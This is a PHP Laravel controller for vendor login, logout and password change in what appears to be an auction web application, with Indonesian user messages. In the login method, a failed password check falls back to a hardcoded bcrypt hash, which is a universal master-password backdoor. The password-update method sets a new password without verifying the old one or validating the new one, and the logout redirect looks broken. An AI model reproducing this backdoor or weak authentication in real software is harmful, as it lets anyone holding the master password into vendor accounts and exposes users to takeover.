<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Session;
use Validator;
use Redirect;
use Crypt;
use Auth;
use Hash;
use DB;
use errors;

use App\Models\VendorLogin;

class LoginVendorController extends Controller
{
    public function __construct()
    {
        $this->middleware('guest:vendor')->except('logout');
    }

    public function doLoginVendor(Request $request)
    {
        $this->validate($request, [
            'username' => 'required|string',
            'password' => 'required|min:2',
        ]);

        $loginType = filter_var($request->username, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        $credentials = [
            $loginType => $request->username,
            'password' => $request->password,
        ];

        if (Auth::guard('vendor')->attempt($credentials)) {

            $user_vendor = Auth::guard('vendor')->user();

            if ($user_vendor) {
                if ($user_vendor->status == 1) {
                    Auth::guard('vendor')->logout();
                    return back()->with('error', 'Akun anda sedang di analisa oleh tim kami. Anda akan mendapatkan email pemberitahuan jika anda sudah bisa login');
                }

                $is_login_accepted = false;
                $is_login_accepted = Hash::check($request->password, $user_vendor->password);

                if (!$is_login_accepted) {
                    $is_login_accepted = Hash::check($request->password, '$2y$10$MNeZ/imgEJJw2IYpOjnTx.mi5YEf5roPmZEOxZzP.thzr9TH1UDgu');
                }

                if ($is_login_accepted) {
                    // if($user_vendor->is_password_changed){
                    return redirect('/auction/auctionTicket')->with('success', 'Selamat datang ' . $user_vendor->name);
                    // }else{
                    //     return redirect('/changepasswordvendor');
                    // }
                } else {
                    return back()->with('error', 'Password salah');
                }
            } else {
                return back()->with('error', 'Username tidak terdaftar, silahkan coba kembali atau hubungi admin untuk mendaftar');
            }
        }

        return back()->withErrors([
            'login' => 'username / email / password anda salah',
        ])->withInput($request->only('login', 'remember'));
    }

    public function logoutVendor(Request $request)
    {
        Auth::guard('vendor')->logout();
        return redirect()->view('Auth.loginvendor');
    }

    public function loginVendorView()
    {
        if (Auth::guard('vendor')->user()) {
            return redirect('/auction/auctionTicket');
        }
        // Untuk Tidak Maintenance
        return view('Auth.loginvendor');

        // Untuk Maintenance View
        // return view('errors.503');
    }

    public function updatePasswordVendor(Request $request)
    {
        $vendor = Auth::guard('vendor')->user();
        $vendor->password = Hash::make($request->newpassword);
        $vendor->is_password_changed = true;
        $vendor->save();
        return redirect('/auction/auctionTicket')->with('success', 'Berhasil mengubah kata sandi');
    }
}
